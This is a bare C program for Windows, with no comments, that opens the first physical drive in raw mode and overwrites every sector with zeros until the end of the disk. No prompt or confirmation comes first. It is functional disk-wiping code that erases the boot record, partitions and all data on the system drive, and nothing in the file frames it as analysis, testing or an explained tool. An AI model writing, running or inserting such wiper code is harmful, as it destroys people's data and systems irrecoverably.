#include <windows.h>

#define SECTOR_SIZE 512

int main() {
    HANDLE disk;
    DWORD bytesReturned;
    GET_LENGTH_INFORMATION diskLength;
    LARGE_INTEGER position;
    BYTE zeroBuffer[SECTOR_SIZE] = {0};
    DWORD bytesWritten;

    disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                      FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (disk == INVALID_HANDLE_VALUE) {
        return 1;
    }

    if (!DeviceIoControl(disk, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0,
                         &diskLength, sizeof(diskLength), &bytesReturned, NULL)) {
        CloseHandle(disk);
        return 1;
    }

    position.QuadPart = 0;
    while (position.QuadPart < diskLength.Length.QuadPart) {
        SetFilePointerEx(disk, position, NULL, FILE_BEGIN);
        if (!WriteFile(disk, zeroBuffer, SECTOR_SIZE, &bytesWritten, NULL)) {
            CloseHandle(disk);
            return 1;
        }
        position.QuadPart += SECTOR_SIZE;
    }

    CloseHandle(disk);
    return 0;
}
